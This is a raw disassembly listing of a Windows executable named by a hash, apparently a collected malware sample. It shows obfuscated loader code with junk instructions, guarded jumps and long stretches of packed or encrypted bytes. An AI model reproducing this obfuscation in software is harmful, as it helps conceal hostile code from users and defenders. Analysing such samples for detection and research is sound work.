
3184c1d2ff50b642d2d323ce856eecc992060cd6dfebc2cc7e5d1d9883be553a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	mov    DWORD PTR ds:0x434429,0x7186
  401015:	mov    DWORD PTR [ebp-0x20],eax
  401018:	mov    ecx,DWORD PTR [ebp-0x20]
  40101b:	mov    DWORD PTR ds:0x43439e,0x6cee
  401025:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40102c:	mov    DWORD PTR ds:0x4326f0,0x6120
  401036:	cmp    ecx,eax
  401038:	mov    DWORD PTR ds:0x43441d,0x7018
  401042:	jne    0x4019f7
  401048:	mov    ax,WORD PTR [ebp-0x24]
  40104c:	push   esi
  40104d:	mov    DWORD PTR ds:0x4326fc,0x1b
  401057:	cmp    DWORD PTR ds:0x4326fc,0x0
  40105e:	je     0x40108e
  401064:	cmp    DWORD PTR ds:0x4326fc,0x22
  40106b:	jne    0x40107c
  401071:	push   0x432dc2
  401076:	call   DWORD PTR ds:0x4329b2
  40107c:	mov    ecx,DWORD PTR ds:0x4326fc
  401082:	dec    ecx
  401083:	mov    DWORD PTR ds:0x4326fc,ecx
  401089:	jmp    0x401057
  40108e:	mov    ecx,0x8a3e
  401093:	mov    DWORD PTR ds:0x43438a,0x48c
  40109d:	xor    ax,cx
  4010a0:	add    DWORD PTR ds:0x434419,0x61ba
  4010aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4010ad:	xor    esi,DWORD PTR ds:0x434396
  4010b3:	push   edi
  4010b4:	mov    DWORD PTR ds:0x43437a,0x1c
  4010be:	cmp    DWORD PTR ds:0x43437a,0x0
  4010c5:	je     0x401105
  4010cb:	cmp    DWORD PTR ds:0x43437a,0x25
  4010d2:	jne    0x4010f3
  4010d8:	push   0x38d9
  4010dd:	push   DWORD PTR [ebp-0xc]
  4010e0:	push   0x7b63
  4010e5:	push   0x618f
  4010ea:	push   DWORD PTR [ebp-0x28]
  4010ed:	call   DWORD PTR ds:0x4329b6
  4010f3:	mov    edi,DWORD PTR ds:0x43437a
  4010f9:	dec    edi
  4010fa:	mov    DWORD PTR ds:0x43437a,edi
  401100:	jmp    0x4010be
  401105:	mov    edi,0x3b04
  40110a:	xor    DWORD PTR ds:0x432700,edx
  401110:	add    ax,di
  401113:	add    DWORD PTR ds:0x43439a,0xf3f
  40111d:	movzx  eax,ax
  401120:	add    DWORD PTR ds:0x4326f4,edi
  401126:	not    eax
  401128:	or     esi,DWORD PTR ds:0x434411
  40112e:	and    eax,DWORD PTR [ecx]
  401130:	movzx  ecx,WORD PTR ds:0x432dc2
  401137:	xor    DWORD PTR ds:0x432de6,ecx
  40113d:	mov    ecx,DWORD PTR [ebp+0x8]
  401140:	sub    DWORD PTR ds:0x434425,ecx
  401146:	mov    DWORD PTR [ecx],eax
  401148:	adc    ecx,0x6b0b
  40114e:	mov    ecx,0x7510855
  401153:	sbb    esi,DWORD PTR ds:0x432dda
  401159:	mov    esi,0x32729c
  40115e:	sbb    DWORD PTR ds:0x434425,0x3918
  401168:	push   ebx
  401169:	or     DWORD PTR ds:0x4343a2,ebx
  40116f:	mov    ax,WORD PTR [ebp-0x24]
  401173:	dec    ebx
  401174:	movzx  eax,ax
  401177:	mov    DWORD PTR [ebp-0x38],eax
  40117a:	sub    eax,0x1c8b
  40117f:	mov    eax,DWORD PTR [ebp+0x8]
  401182:	mov    DWORD PTR [ebp-0x28],eax
  401185:	xor    eax,eax
  401187:	or     eax,DWORD PTR ds:0x432dce
  40118d:	add    DWORD PTR ds:0x434376,eax
  401193:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  40119a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4011a1:	mov    eax,0x9577
  4011a6:	or     DWORD PTR ds:0x43439a,0x2325
  4011b0:	mov    WORD PTR [ebp-0x4],ax
  4011b4:	movzx  ebx,BYTE PTR ds:0x4326f4
  4011bb:	or     DWORD PTR ds:0x4326f0,ebx
  4011c1:	lea    eax,[ebp-0x30]
  4011c4:	mov    DWORD PTR [ebp-0x34],eax
  4011c7:	mov    eax,DWORD PTR [ebp-0x28]
  4011ca:	mov    DWORD PTR [ebp-0x2c],eax
  4011cd:	add    DWORD PTR ds:0x434419,0x693e
  4011d7:	lea    eax,[ebp-0x18]
  4011da:	and    DWORD PTR ds:0x43436a,0x0
  4011e4:	jmp    0x4011f6
  4011e9:	mov    ebx,DWORD PTR ds:0x43436a
  4011ef:	inc    ebx
  4011f0:	mov    DWORD PTR ds:0x43436a,ebx
  4011f6:	cmp    DWORD PTR ds:0x43436a,0x18
  4011fd:	jae    0x40123a
  401203:	cmp    DWORD PTR ds:0x43436a,0x8
  40120a:	jne    0x40121b
  401210:	push   0x7a50
  401215:	call   DWORD PTR ds:0x4329ba
  40121b:	cmp    DWORD PTR ds:0x43436a,0x7
  401222:	jne    0x401235
  401228:	mov    ebx,DWORD PTR ds:0x43436a
  40122e:	inc    ebx
  40122f:	mov    DWORD PTR ds:0x43436a,ebx
  401235:	jmp    0x4011e9
  40123a:	mov    DWORD PTR [ebp-0x1c],eax
  40123d:	mov    eax,DWORD PTR [ebp-0x1c]
  401240:	mov    DWORD PTR [eax],0xf89f2da9
  401246:	mov    eax,DWORD PTR [ebp-0x14]
  401249:	mov    ebx,DWORD PTR [ebp-0x8]
  40124c:	and    DWORD PTR ds:0x434415,0x66ce
  401256:	xor    eax,ecx
  401258:	xor    ebx,ecx
  40125a:	and    DWORD PTR ds:0x434419,0x3a0f
  401264:	xor    edx,edx
  401266:	and    DWORD PTR ds:0x432de6,0x4326f0
  401270:	add    eax,esi
  401272:	mov    DWORD PTR ds:0x43441d,0x1b71
  40127c:	add    ebx,esi
  40127e:	div    ebx
  401280:	mov    DWORD PTR ds:0x434376,0x5747
  40128a:	mov    edx,DWORD PTR [ebp-0x2c]
  40128d:	mov    DWORD PTR ds:0x4326f4,0x57da
  401297:	cmp    eax,DWORD PTR [edx]
  401299:	mov    DWORD PTR ds:0x434382,0x6b31
  4012a3:	je     0x4019ca
  4012a9:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4012b0:	lea    eax,[ebp-0xc]
  4012b3:	sbb    edx,DWORD PTR ds:0x432dca
  4012b9:	mov    DWORD PTR [ebp-0x10],eax
  4012bc:	mov    eax,DWORD PTR [ebp-0x10]
  4012bf:	jmp    0x401447
  4012c4:	popa   
  4012c5:	xchg   BYTE PTR ds:0x6151e949,cl
  4012cb:	mov    dh,0x3f
  4012cd:	mov    ah,0xd5
  4012cf:	mov    dl,0xec
  4012d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012d2:	call   0xe570:0x707070c5
  4012d9:	jg     0x40134b
  4012db:	jo     0x40129d
  4012dd:	xlat   BYTE PTR ds:[ebx]
  4012de:	cmp    eax,0xcfd339d5
  4012e3:	rol    edx,1
  4012e5:	pop    es
  4012e6:	push   es
  4012e7:	add    eax,DWORD PTR [eax]
  4012e9:	add    BYTE PTR [edx],0xf
  4012ec:	xor    ecx,DWORD PTR [edi]
  4012ee:	ret    0xc71a
  4012f1:	adc    bl,BYTE PTR [edi]
  4012f3:	mov    ecx,0xddb7025a
  4012f8:	add    bh,ch
  4012fa:	mov    ebp,0x8003c8db
  4012ff:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401305:	lods   eax,DWORD PTR ds:[esi]
  401306:	sar    BYTE PTR [eax+0x6fee581f],1
  40130c:	or     edx,DWORD PTR [ecx]
  40130e:	sahf   
  40130f:	jp     0x4012d9
  401311:	inc    edx
  401312:	lods   al,BYTE PTR ds:[esi]
  401313:	push   ebx
  401314:	sub    eax,0xad3ec6d1
  401319:	mov    WORD PTR [ebx-0x3b],?
  40131c:	stos   DWORD PTR es:[edi],eax
  40131d:	js     0x4012e5
  40131f:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401325:	jmp    0x401359
  401327:	mov    ebp,ecx
  401329:	dec    edi
  40132a:	fcomp  DWORD PTR [eax-0x656800bf]
  401330:	pop    es
  401331:	test   eax,0xed4dbddc
  401336:	sub    BYTE PTR [ebp+0x23],dl
  401339:	mov    ah,0xec
  40133b:	pusha  
  40133c:	nop
  40133d:	mov    esi,0x94c3117b
  401342:	and    esi,edx
  401344:	jmp    0x401396
  401346:	(bad)  
  401347:	out    0xba,al
  401349:	repnz in al,dx
  40134b:	xchg   esp,eax
  40134c:	xor    edi,ecx
  40134e:	jbe    0x4013b5
  401350:	xlat   BYTE PTR ds:[ebx]
  401351:	and    cl,ch
  401353:	add    al,0xd9
  401355:	adc    DWORD PTR [ecx-0x68],edx
  401358:	xor    eax,0x7a616f03
  40135d:	or     dh,BYTE PTR [ecx]
  40135f:	fld    QWORD PTR [eax+0x7f752a56]
  401365:	xor    BYTE PTR [edi+0xba8db0c],cl
  40136b:	pop    ebx
  40136c:	push   ebp
  40136d:	(bad)  
  40136f:	or     ebx,edx
  401371:	pop    esi
  401372:	fstp   DWORD PTR [ecx]
  401374:	jno    0x401306
  401376:	mov    eax,0x2b15374b
  40137b:	ja     0x4013a6
  40137d:	sbb    al,0xd3
  40137f:	xor    BYTE PTR [edi-0x16],cl
  401382:	into   
  401383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401384:	push   edi
  401385:	popf   
  401386:	add    eax,0xbf4be13d
  40138b:	push   es
  40138c:	mov    al,ds:0x6388092e
  401391:	cmp    BYTE PTR [edi+0x4e],ah
  401394:	ds je  0x401334
  401397:	std    
  401398:	scas   al,BYTE PTR es:[edi]
  401399:	in     al,dx
  40139a:	inc    edx
  40139b:	mov    al,0xb8
  40139d:	leave  
  40139e:	xchg   DWORD PTR [edx],eax
  4013a0:	aam    0x6a
  4013a2:	add    BYTE PTR [esi],ch
  4013a4:	add    al,0x94
  4013a6:	adc    edi,DWORD PTR [ecx]
  4013a8:	sbb    BYTE PTR [esi-0x1a],cl
  4013ab:	daa    
  4013ac:	add    DWORD PTR ds:0xb46e33cb,eax
  4013b2:	add    dh,ah
  4013b4:	dec    esi
  4013b5:	pop    esi
  4013b6:	aaa    
  4013b7:	xchg   esp,eax
  4013b8:	aad    0x4b
  4013ba:	test   ah,cl
  4013bc:	fsub   DWORD PTR [edi-0x30ba406a]
  4013c2:	add    bh,dh
  4013c4:	adc    BYTE PTR [eax-0x3ab98350],ah
  4013ca:	pop    esi
  4013cb:	dec    edi
  4013cc:	(bad)  
  4013ce:	inc    ebx
  4013cf:	mov    al,ds:0x46e9dcfe
  4013d4:	pusha  
  4013d5:	jo     0x4013f5
  4013d7:	fst    st(4)
  4013d9:	rol    al,1
  4013db:	jge    0x40139c
  4013dd:	pop    ss
  4013de:	mov    eax,ds:0xa8b2972d
  4013e3:	aas    
  4013e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013e6:	cld    
  4013e7:	inc    esp
  4013e8:	in     al,0x77
  4013ea:	inc    edi
  4013eb:	loop   0x401381
  4013ed:	dec    ecx
  4013ee:	fnstenv [eax]
  4013f0:	cli    
  4013f1:	out    dx,al
  4013f2:	sub    al,0x49
  4013f4:	dec    edx
  4013f5:	xlat   BYTE PTR ds:[ebx]
  4013f6:	in     eax,0x9d
  4013f8:	jg     0x40142d
  4013fa:	nop
  4013fb:	sub    bh,al
  4013fd:	retf   0xbd6
  401400:	cvtps2pi mm6,QWORD PTR [ebx+esi*4]
  401404:	iret   
  401405:	add    BYTE PTR [edi],0xd6
  401408:	add    dl,ch
  40140a:	sbb    cl,dh
  40140c:	push   eax
  40140d:	imul   esp,ecx,0xffffffd8
  401410:	mov    al,ds:0x742138d8
  401415:	dec    esi
  401416:	sub    al,0xac
  401418:	push   cs
  401419:	inc    esp
  40141a:	sbb    al,0x40
  40141c:	mov    dl,0xda
  40141e:	hlt    
  40141f:	inc    edx
  401420:	adc    cl,BYTE PTR [ebx+0x5b]
  401423:	pusha  
  401424:	mov    dh,0x1d
  401426:	cmp    al,0x1f
  401428:	je     0x401453
  40142a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40142b:	jmp    0x401443
  40142d:	pop    ebx
  40142e:	inc    eax
  40142f:	cdq    
  401430:	(bad)  
  401431:	shl    BYTE PTR [eax+esi*1],1
  401434:	inc    eax
  401435:	(bad)  
  401437:	adc    al,BYTE PTR [eax-0x6ae4536d]
  40143d:	ss mov ebx,0xe9f62b84
  401443:	push   eax
  401444:	imul   edi,DWORD PTR [edi+0x69108b67],0xffffffd2
  40144b:	in     al,dx
  40144c:	test   eax,0x1089f89e
  401451:	mov    eax,DWORD PTR [ebp-0xc]
  401454:	cmp    eax,0x742b26d4
  401459:	jmp    0x4015e1
  40145e:	push   ds
  40145f:	fcmovnb st,st(2)
  401461:	mov    edx,0x5ba661c1
  401466:	xlat   BYTE PTR ds:[ebx]
  401467:	les    ecx,FWORD PTR [esi]
  401469:	test   DWORD PTR [ebp-0x1a360352],edi
  40146f:	jg     0x4014e1
  401471:	jo     0x401458
  401473:	jg     0x4014e5
  401475:	jo     0x4014dc
  401477:	jg     0x40143b
  401479:	inc    ecx
  40147a:	adc    al,0xaa
  40147c:	xor    ebx,DWORD PTR [edx]
  40147e:	xchg   BYTE PTR [ebx],ch
  401480:	loope  0x40149a
  401482:	(bad)  
  401483:	pop    ecx
  401484:	sub    BYTE PTR [ebx],al
  401486:	mov    ebx,0xfb11b00a
  40148b:	push   edx
  40148c:	scas   al,BYTE PTR es:[edi]
  40148d:	cmp    DWORD PTR [esi-0x50],0xffffffaf
  401491:	mov    bh,0x66
  401493:	push   edx
  401494:	mov    ds:0x3a406e68,eax
  401499:	pushf  
  40149a:	rcr    DWORD PTR [edx-0x23],1
  40149d:	pop    edx
  40149e:	fdecstp 
  4014a0:	repz add esp,esp
  4014a3:	jae    0x4014e4
  4014a5:	(bad)  
  4014a6:	push   0x6b1908d7
  4014ab:	and    al,0xb
  4014ad:	jmp    0x831e46f8
  4014b2:	dec    ecx
  4014b3:	into   
  4014b4:	ins    BYTE PTR es:[edi],dx
  4014b5:	cmp    DWORD PTR [eax+edx*8-0x28],ebp
  4014b9:	popf   
  4014ba:	push   es
  4014bb:	scas   eax,DWORD PTR es:[edi]
  4014bc:	addr16 cdq 
  4014be:	fcomp  DWORD PTR [ebp-0x261b8518]
  4014c4:	leave  
  4014c5:	in     eax,0xcf
  4014c7:	in     al,0xe7
  4014c9:	jge    0x401458
  4014cb:	mov    bh,0x25
  4014cd:	imul   eax,DWORD PTR [eax-0x64],0x357c7720
  4014d4:	lods   eax,DWORD PTR ds:[esi]
  4014d5:	je     0x4014b9
  4014d7:	jbe    0x401469
  4014d9:	adc    al,0xc4
  4014db:	shr    BYTE PTR [ecx-0x4b],0x3a
  4014df:	pop    es
  4014e0:	retf   
  4014e1:	mov    ds:0xb8d31a3a,al
  4014e6:	ins    BYTE PTR es:[edi],dx
  4014e7:	rep outs dx,DWORD PTR ds:[esi]
  4014e9:	jo     0x4014c4
  4014eb:	jb     0x40153f
  4014ed:	inc    eax
  4014ee:	push   ds
  4014ef:	mov    bh,0x9f
  4014f1:	jp     0x4014a3
  4014f3:	ficom  DWORD PTR ds:0xe4058c4b
  4014f9:	test   eax,0x5e89c398
  4014fe:	dec    ecx
  4014ff:	aaa    
  401500:	inc    ecx
  401501:	mov    eax,0xc1c1d6ca
  401506:	imul   esp,DWORD PTR [edx-0x223322cf],0xe1eabc64
  401510:	sub    DWORD PTR [ebx-0x67],edi
  401513:	test   al,0x90
  401515:	xchg   ecx,ecx
  401517:	xor    dl,BYTE PTR [eax]
  401519:	mov    al,0xfe
  40151b:	in     al,dx
  40151c:	xchg   ecx,eax
  40151d:	hlt    
  40151e:	lea    ebp,ds:0x93085514
  401524:	push   0xa675b916
  401529:	xor    DWORD PTR [esi+ebx*4],0x706d0bab
  401530:	xchg   DWORD PTR [eax-0x2],esi
  401533:	pop    ss
  401534:	daa    
  401535:	xor    BYTE PTR [eax],bh
  401537:	aam    0x94
  401539:	dec    ebx
  40153a:	xchg   ch,ah
  40153c:	xor    ch,BYTE PTR [ebx+0x48]
  40153f:	xchg   ebx,eax
  401540:	mov    al,ds:0xd100eedf
  401545:	ror    ah,0x7
  401548:	leave  
  401549:	gs jne 0x4014f4
  40154c:	cld    
  40154d:	ror    DWORD PTR [eax-0x41],cl
  401550:	or     esp,edi
  401552:	in     al,0xc
  401554:	test   BYTE PTR [ecx],cl
  401556:	xchg   edx,eax
  401557:	mov    edi,0x531dd91d
  40155c:	sbb    BYTE PTR [edi+0x1012655f],dl
  401562:	jo     0x4014f1
  401564:	adc    al,BYTE PTR [eax+0x30]
  401567:	xor    al,0xb1
  401569:	mov    esi,0x50acf7f2
  40156e:	out    0x46,al
  401570:	arpl   WORD PTR [esi],dx
  401572:	sbb    BYTE PTR [ebp+0x39],dl
  401575:	mov    eax,0x70f1a07e
  40157a:	sbb    al,0x44
  40157c:	push   esi
  40157d:	jmp    0xfdc6dfaf
  401582:	hlt    
  401583:	fimul  WORD PTR [eax+edx*2]
  401586:	dec    edi
  401587:	jl     0x401574
  401589:	les    edi,FWORD PTR [ecx-0x67]
  40158c:	mov    esi,0x92a2acf9
  401591:	xor    BYTE PTR [eax-0x69],0xb1
  401595:	push   ds
  401596:	rol    DWORD PTR [edx-0x61f8280c],cl
  40159c:	xchg   edx,eax
  40159d:	jl     0x401585
  40159f:	pop    ss
  4015a0:	dec    ebx
  4015a1:	popa   
  4015a2:	jmp    0x8bbd:0x5e0bd364
  4015a9:	add    bh,bh
  4015ab:	repz imul ebp,DWORD PTR [edx+0x69],0x21
  4015b0:	sub    al,0x8b
  4015b2:	test   BYTE PTR ds:0xe0fc0604,0x59
  4015b9:	xchg   ebp,eax
  4015ba:	push   DWORD PTR [ebp+edi*4-0x45d50941]
  4015c1:	(bad)  
  4015c2:	xchg   BYTE PTR [eax+0x49f7e03e],dh
  4015c8:	xchg   esi,eax
  4015c9:	test   edi,ebx
  4015cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015cc:	cmc    
  4015cd:	mov    ecx,esp
  4015cf:	mov    dl,0xb8
  4015d1:	aaa    
  4015d2:	(bad)  
  4015d3:	mov    bl,0x21
  4015d5:	fcmovu st,st(5)
  4015d7:	xor    DWORD PTR [edi+0x38fb368e],eax
  4015dd:	ss xchg ebx,eax
  4015df:	jmp    0x40165c
  4015e1:	je     0x4015f5
  4015e7:	mov    eax,DWORD PTR [ebp-0x1c]
  4015ea:	or     DWORD PTR [eax],0x60751c9c
  4015f0:	jmp    0x4019d9
  4015f5:	mov    eax,DWORD PTR [ebp-0xc]
  4015f8:	add    eax,DWORD PTR [ebp-0x18]
  4015fb:	cmp    eax,0x6cca547d
  401600:	je     0x401614
  401606:	mov    eax,DWORD PTR [ebp-0x10]
  401609:	and    DWORD PTR [eax],0x751c99
  40160f:	jmp    0x4019d9
  401614:	mov    eax,DWORD PTR [ebp-0xc]
  401617:	mov    edx,DWORD PTR [ebp-0x18]
  40161a:	or     eax,edx
  40161c:	cmp    eax,0xfcbf2ffd
  401621:	je     0x401635
  401627:	mov    eax,DWORD PTR [ebp-0x10]
  40162a:	xor    DWORD PTR [eax],0x2650fa8f
  401630:	jmp    0x4019d9
  401635:	mov    ax,WORD PTR [ebp-0x4]
  401639:	mov    edx,0x8a3e
  40163e:	xor    ax,dx
  401641:	mov    edx,DWORD PTR [ebp-0x28]
  401644:	mov    edx,DWORD PTR [edx]
  401646:	add    ax,di
  401649:	cmp    ax,WORD PTR [edx]
  40164c:	je     0x401821
  401652:	mov    eax,DWORD PTR [ebp-0x14]
  401655:	xor    eax,ecx
  401657:	add    eax,esi
  401659:	mov    DWORD PTR [ebp-0x30],eax
  40165c:	mov    eax,DWORD PTR [ebp-0x34]
  40165f:	mov    dx,WORD PTR [ebp-0x38]
  401663:	mov    ebx,0x8a3e
  401668:	xor    dx,bx
  40166b:	mov    ebx,DWORD PTR [ebp-0x8]
  40166e:	add    dx,di
  401671:	jmp    0x4017f9
  401676:	clc    
  401677:	repnz sbb eax,0xa851698d
  40167d:	icebp  
  40167e:	pusha  
  40167f:	xchg   ebx,eax
  401680:	rcl    DWORD PTR [ebx+0x46],1
  401683:	int    0x65
  401685:	push   0x4a
  401687:	jle    0x4016f9
  401689:	jo     0x401670
  40168b:	jg     0x4016fd
  40168d:	jo     0x401706
  40168f:	and    al,0x3
  401691:	xlat   BYTE PTR ds:[ebx]
  401692:	mov    ecx,0x6c65c6c5
  401697:	and    ah,BYTE PTR ds:0x55b24199
  40169d:	push   ebx
  40169e:	dec    edi
  40169f:	jl     0x4016e5
  4016a1:	dec    esp
  4016a2:	xor    al,0xe1
  4016a4:	adc    DWORD PTR [edi+ecx*1+0x6f0a5fd6],ecx
  4016ab:	or     dh,BYTE PTR [esi-0x58f25ca2]
  4016b1:	xor    al,0x5a
  4016b3:	jnp    0x4016d2
  4016b5:	push   esp
  4016b6:	mov    ecx,0x89ec0ccf
  4016bb:	or     eax,0x3360e8ff
  4016c0:	and    DWORD PTR [esi+0x51],ebx
  4016c3:	jle    0x4016a6
  4016c5:	jge    0x401698
  4016c7:	and    eax,0x71
  4016ca:	jno    0x40168b
  4016cc:	dec    ebx
  4016cd:	xchg   esp,eax
  4016ce:	mov    bl,0xed
  4016d0:	ret    0xc59f
  4016d3:	jnp    0x40172a
  4016d5:	mov    ch,0xdc
  4016d7:	jmp    0x452e:0xfcda2673
  4016de:	mov    ebx,esi
  4016e0:	inc    eax
  4016e1:	fwait
  4016e2:	push   ds
  4016e3:	cli    
  4016e4:	push   esp
  4016e5:	repnz xchg edi,eax
  4016e7:	adc    cl,BYTE PTR [ecx+ebp*2+0x7b4be1c2]
  4016ee:	xchg   BYTE PTR [esi],al
  4016f0:	inc    edi
  4016f1:	pop    es
  4016f2:	jnp    0x4016b8
  4016f4:	les    eax,FWORD PTR [ebx-0x58]
  4016f7:	(bad)  [ebp-0x69]
  4016fa:	add    eax,ecx
  4016fc:	sbb    bh,BYTE PTR [eax]
  4016fe:	xchg   ebp,eax
  4016ff:	fs nop
  401701:	jmp    0xd5d71075
  401706:	test   DWORD PTR [esi],ecx
  401708:	daa    
  401709:	hlt    
  40170a:	push   es
  40170b:	mov    cl,0x3b
  40170d:	inc    ebp
  40170e:	add    ch,0x33
  401711:	cmp    eax,0x647579e0
  401716:	popf   
  401717:	test   ah,0xf
  40171a:	jb     0x4016cf
  40171c:	sub    BYTE PTR [esi-0x5c66c83],ah
  401722:	adc    eax,0x2d5bc27
  401727:	adc    edx,DWORD PTR ds:0x586f31ad
  40172d:	les    edi,FWORD PTR [ebx+0x11cee7b7]
  401733:	gs mov dl,0xf6
  401736:	mov    esp,0x7f41e586
  40173b:	dec    esi
  40173c:	mov    edx,0x6e037f21
  401741:	mov    al,ds:0x89dc7a88
  401746:	test   BYTE PTR ds:0xd235b6e2,cl
  40174c:	pop    ds
  40174d:	in     eax,dx
  40174e:	mov    ch,0x54
  401750:	mov    ah,0x40
  401752:	xchg   DWORD PTR [esi+0x69],edx
  401755:	hlt    
  401756:	mov    ds:0xc112aeea,al
  40175b:	xor    DWORD PTR [ecx-0x30],0x11f73c42
  401762:	fwait
  401763:	lea    ebp,[ebx-0x47]
  401766:	mov    al,0x2b
  401768:	xor    BYTE PTR [ebx-0x6987aeb9],ah
  40176e:	gs out 0x92,eax
  401771:	jno    0x401718
  401773:	fnstsw WORD PTR [edi+0x173fd6cb]
  401779:	push   edx
  40177a:	xchg   ebp,eax
  40177b:	sub    eax,0x35facb1a
  401780:	cs or  ah,ch
  401783:	in     eax,0x48
  401785:	popa   
  401786:	call   DWORD PTR [eax+eax*4]
  401789:	or     DWORD PTR ss:[esi-0x2cb317d6],0x997ed120
  401794:	es dec ebx
  401796:	loopne 0x401736
  401798:	ja     0x40171b
  40179a:	lds    edx,FWORD PTR [edx+eiz*2-0x71]
  40179e:	xchg   edx,eax
  40179f:	test   al,0xb2
  4017a1:	mov    al,0x65
  4017a3:	xchg   BYTE PTR [ebx],ch
  4017a5:	sar    cl,0x2d
  4017a8:	sub    bh,dl
  4017aa:	pop    edx
  4017ab:	dec    eax
  4017ac:	vmaxsd xmm5,xmm6,QWORD PTR [eax+0x12]
  4017b1:	imul   ebp,DWORD PTR [eax],0xb77c83
  4017b7:	cli    
  4017b8:	mov    edx,0xb3d0c690
  4017bd:	mov    edi,DWORD PTR [ebx-0x120f14f2]
  4017c3:	retf   
  4017c4:	js     0x401842
  4017c6:	adc    dh,BYTE PTR ss:[edi+ebp*8+0x47]
  4017cb:	enter  0x6f5c,0x86
  4017cf:	mov    ch,0x4f
  4017d1:	cmp    DWORD PTR [ebp-0x4d],esp
  4017d4:	pop    edi
  4017d5:	cmp    al,0xf4
  4017d7:	add    esi,esp
  4017d9:	lods   eax,DWORD PTR ds:[esi]
  4017da:	loopne 0x4017c7
  4017dc:	cmp    dh,dl
  4017de:	(bad)  
  4017df:	adc    eax,0xaea2d7ed
  4017e4:	adc    BYTE PTR [eax],dl
  4017e6:	and    esi,0xffffffbd
  4017e9:	jp     0x4017ee
  4017eb:	test   ah,dh
  4017ed:	rcl    DWORD PTR [ebx-0x20],cl
  4017f0:	cmp    edx,DWORD PTR [ebx+eiz*1]
  4017f3:	cwde   
  4017f4:	ror    BYTE PTR [si+0x7b19],cl
  4017f9:	movzx  edx,dx
  4017fc:	xor    ebx,ecx
  4017fe:	lea    edx,[edx+ebx*1+0x32729c]
  401805:	add    DWORD PTR [eax],edx
  401807:	mov    eax,DWORD PTR [ebp-0x2c]
  40180a:	mov    edx,DWORD PTR [ebp-0x8]
  40180d:	mov    ebx,DWORD PTR [ebp-0x30]
  401810:	xor    edx,ecx
  401812:	add    edx,esi
  401814:	imul   edx,ebx
  401817:	sub    DWORD PTR [eax],edx
  401819:	mov    eax,DWORD PTR [ebp-0x14]
  40181c:	jmp    0x4019dc
  401821:	mov    eax,DWORD PTR [ebp-0xc]
  401824:	mov    edx,DWORD PTR [ebp-0x18]
  401827:	jmp    0x4019af
  40182c:	pop    ebx
  40182d:	arpl   di,di
  40182f:	out    dx,eax
  401830:	xchg   ebx,esi
  401832:	imul   esi,DWORD PTR [ebx-0x5d],0x7d
  401836:	jae    0x401839
  401838:	mov    al,0xf9
  40183a:	out    dx,eax
  40183b:	out    0x3f,al
  40183d:	jl     0x4018af
  40183f:	jo     0x401826
  401841:	jg     0x4018b3
  401843:	jo     0x4017ea
  401845:	mov    esi,0xde49b29b
  40184a:	inc    esp
  40184b:	cmp    eax,esi
  40184d:	mov    ebp,DWORD PTR [edi-0x4a0232cc]
  401853:	shr    DWORD PTR [esi+0x79],0x8
  401857:	mov    ds:0xaf2ac3d,al
  40185c:	inc    esp
  40185d:	mov    eax,0xdaf318ca
  401862:	sti    
  401863:	cmp    DWORD PTR [ebp-0x171496f4],ebx
  401869:	out    dx,al
  40186a:	cld    
  40186b:	xlat   BYTE PTR ds:[ebx]
  40186c:	and    eax,0x4d616fc9
  401871:	fstp   st(0)
  401873:	cwde   
  401874:	adc    cl,BYTE PTR [edi+0x5e]
  401877:	jl     0x401810
  401879:	pop    ss
  40187a:	mov    ch,0xf3
  40187c:	jbe    0x401866
  40187e:	dec    ecx
  40187f:	lea    esp,[eax+edx*2+0x5e]
  401883:	in     al,dx
  401884:	inc    ch
  401886:	jne    0x401852
  401888:	enter  0xbcb6,0x81
  40188c:	jmp    0xa0a442d1
  401891:	mov    ah,BYTE PTR [ebx]
  401893:	pop    edx
  401894:	(bad)  
  401895:	jmp    0x4018a5
  401897:	das    
  401898:	lds    ecx,FWORD PTR [edi]
  40189a:	jmp    0xffc62a66
  40189f:	bound  ecx,QWORD PTR [edi]
  4018a1:	and    BYTE PTR [edi-0x43730175],ch
  4018a7:	shl    BYTE PTR [esp+esi*4],0x2
  4018ab:	pusha  
  4018ac:	test   al,0xe0
  4018ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018af:	test   eax,0xdfc8270a
  4018b4:	repnz mul DWORD PTR [ecx-0x7580b726]
  4018bb:	pop    es
  4018bc:	xchg   DWORD PTR [edi+0x74c4ef59],eax
  4018c2:	jbe    0x4018f8
  4018c4:	mov    DWORD PTR [ebx+0x6d4fb346],ebp
  4018ca:	and    DWORD PTR [ebx],esp
  4018cc:	xor    eax,DWORD PTR [esi]
  4018ce:	add    eax,0x8ea24c5b
  4018d3:	lea    esp,[ecx-0x4f]
  4018d6:	or     ah,BYTE PTR [ebp-0x5d]
  4018d9:	pop    edi
  4018da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018db:	stos   DWORD PTR es:[edi],eax
  4018dc:	push   edi
  4018dd:	or     dh,cl
  4018df:	mov    ebx,0xd8888110
  4018e4:	nop
  4018e5:	mov    ecx,0x1569b4fb
  4018ea:	or     dh,dl
  4018ec:	jecxz  0x4018e8
  4018ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018ef:	sbb    ebx,ecx
  4018f1:	pop    edi
  4018f2:	or     DWORD PTR [esi-0x6042d718],ebx
  4018f8:	adc    BYTE PTR [ecx],al
  4018fa:	jmp    0x80bbdf10
  4018ff:	xchg   edi,eax
  401900:	retf   0x542f
  401903:	gs ins DWORD PTR es:[edi],dx
  401905:	or     al,BYTE PTR [edi+0x3c]
  401908:	cmp    edi,DWORD PTR [eax-0x14]
  40190b:	lea    ebx,[eax-0x74276110]
  401911:	mov    dh,BYTE PTR ds:0xc32ace50
  401917:	xchg   ecx,eax
  401918:	dec    esp
  401919:	inc    ecx
